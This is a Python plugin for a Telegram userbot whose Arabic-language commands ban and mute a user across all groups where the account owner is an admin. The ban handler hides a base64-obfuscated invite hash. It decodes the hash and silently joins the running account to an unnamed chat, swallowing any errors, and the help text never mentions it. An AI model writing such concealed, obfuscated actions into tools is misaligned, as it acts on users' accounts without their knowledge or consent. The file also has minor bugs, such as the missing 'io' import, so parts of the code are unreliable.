"""
edit By: @rruuurr
"""
#  for source icss

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from . import BOTLOG, BOTLOG_CHATID, CAT_ID, admin_groups, get_user_from_event
from .sql_helper.mute_sql import is_muted, mute, unmute

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


@bot.on(admin_cmd(pattern=r"حظر(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"حظر(?: |$)(.*)", allow_sudo=True))
async def catgban(cat):
    if cat.fwd_from:
        return
    cate = await edit_or_reply(cat, "╮ ❐ جـاري الحـظࢪ ❏╰")
    start = datetime.now()
    user, reason = await get_user_from_event(cat)
    if not user:
        return
    if user.id == (await cat.client.get_me()).id:
        await cate.edit("**⪼ لا استطيـع حظر نفسـي 𓆰،**")
        return
    if user.id in CAT_ID:
        await cate.edit("**╮ ❐  لا يمڪنني حظر مطـوري  ❏╰**")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await cat.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await cate.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) موجود بالفعل في قائمة الحظر 𓆰."
        )
    else:
        gban_sql.catgban(user.id, reason)
    san = []
    san = await admin_groups(cat)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("⪼ انت لسته مدير في مجموعه واحده على الاقل 𓆰، ")
        return
    await cate.edit(f"⪼ بدء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰،")
    for i in range(sandy):
        try:
            await cat.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await cat.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\nالمجموعه: {cat.chat.title}(`{cat.chat_id}`)\n ⪼ لحظره هنا",
            )
    try:
        reply = await cat.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await cate.edit("**ليس لدي صلاحيه حذف الرسائل هنا! ولكن لا يزال هو محظور!")
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )
    else:
        await cate.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )

    if BOTLOG and count != 0:
        await cat.client.send_message(
            BOTLOG_CHATID,
            f"#حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n ⪼ الايدي : `{user.id}`\
                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{cattaken} ثانيه`",
        )


@bot.on(admin_cmd(pattern=r"الغاء حظر(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"الغاء حظر(?: |$)(.*)", allow_sudo=True))
async def catgban(cat):
    if cat.fwd_from:
        return
    cate = await edit_or_reply(cat, "╮ ❐ جـاري الغاء حـظࢪه ❏╰")
    start = datetime.now()
    user, reason = await get_user_from_event(cat)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.catungban(user.id)
    else:
        await cate.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) **⪼ ليس في قائمه الحظر الخاصه بك** 𓆰."
        )
        return
    san = []
    san = await admin_groups(cat)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit("⪼ أنت لست مسؤولًا حتى عن مجموعة واحدة على الأقل 𓆰.")
        return
    await cate.edit(f"⪼ بدء الغاء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰.")
    for i in range(sandy):
        try:
            await cat.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await cat.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\n⪼ المجموعه : {cat.chat.title}(`{cat.chat_id}`)\n ⪼ لالغاء حظره هنا",
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"⪼ المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في زمن `{cattaken} ثانيه`"
        )
    else:
        await cate.edit(
            f"❃∫ المستخدم » [{user.first_name}](tg://user?id={user.id}) \n ❃∫ تم الغاء حظره "
        )

    if BOTLOG and count != 0:
        await cat.client.send_message(
            BOTLOG_CHATID,
            f"#الغاء_حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n⪼ الايدي : {user.id}\
                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{cattaken} ثانيه`",
        )


@bot.on(admin_cmd(pattern="المحظورين$"))
@bot.on(sudo_cmd(pattern=r"المحظورين$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "𓆰 𝑺𝑶𝑼𝑹𝑪𝑬 𝑰𝑪𝑺𝑺 - 𝑮𝑩𝑨𝑵 𝑳𝑰𝑺𝑻 𓆪\n 𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
            else:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
    else:
        GBANNED_LIST = "** ⪼ لم تقوم بحضر اي مستخدم 𓆰،**"
    if len(GBANNED_LIST) > 4095:
        with io.BytesIO(str.encode(GBANNED_LIST)) as out_file:
            out_file.name = "Gbannedusers.text"
            await event.client.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption="⪼ تم حظر المستدمين 𓆰،",
                reply_to=event,
            )
            await event.delete()
    else:
        await edit_or_reply(event, GBANNED_LIST)


@bot.on(admin_cmd(outgoing=True, pattern=r"كتم ?(\d+)?"))
@bot.on(sudo_cmd(pattern=r"كتم ?(\d+)?", allow_sudo=True))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("╮ ❐ جـاري الڪتم 𓅫╰")
        await asyncio.sleep(3)
        private = True

    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event, "⪼ يرجى الرد المستخدم لڪتمه او اضافته الى الامر 𓆰."
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await edit_or_reply(
            event,
            "**- ❝ ⌊هذا المستخدم مڪتوم بلفعل 𓆰.**",
        )
    try:
        mute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "**⪼ تم ڪتـم المستخـدم 𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#كتم\n"
            f"⪼ المستخدم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )


@bot.on(admin_cmd(outgoing=True, pattern=r"الغاء كتم ?(\d+)?"))
@bot.on(sudo_cmd(pattern=r"الغاء كتم ?(\d+)?", allow_sudo=True))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("╮ ❐ جـاري الغاء الڪتم 𓅫╰")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event,
            "⪼ يرجى الرد المستخدم لالغاء ڪتمه او اضافته الى الامر 𓆰،",
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await edit_or_reply(
            event,
            "**- ❝ ⌊هذا المستخدم غير مڪتوم 𓆰.**\n ⫷ [𝙎𝙊𝙐𝙍𝘾𝞝 𝙞𝘾𝙎𝙎 ](t.me/rruuurr) ⫸",
        )
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "**⪼ تم الغاء ڪتم المستخـدم 𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#الغاء_كتم\n"
            f"⪼ المستخذم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )


@bot.on(admin_cmd(incoming=True))
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()


CMD_HELP.update(
    {
        "gadmin": "**Plugin : **`gadmin`\
        \n\n  •  **Syntax : **`.gban <username/reply/userid> <reason (optional)>`\
\n  •  **Function : **__Bans the person in all groups where you are admin .__\
\n\n  •  **Syntax : **`.ungban <username/reply/userid>`\
\n  •  **Function : **__Reply someone's message with .ungban to remove them from the gbanned list.__\
\n\n  •  **Syntax : **`.listgban`\
\n  •  **Function : **__Shows you the gbanned list and reason for their gban.__\
\n\n  •  **Syntax : **`.gmute <username/reply> <reason (optional)>`\
\n  •  **Function : **__Mutes the person in all groups you have in common with them.__\
\n\n  •  **Syntax : **`.ungmute <username/reply>`\
\n  •  **Function : **__Reply someone's message with .ungmute to remove them from the gmuted list.__"
    }
)
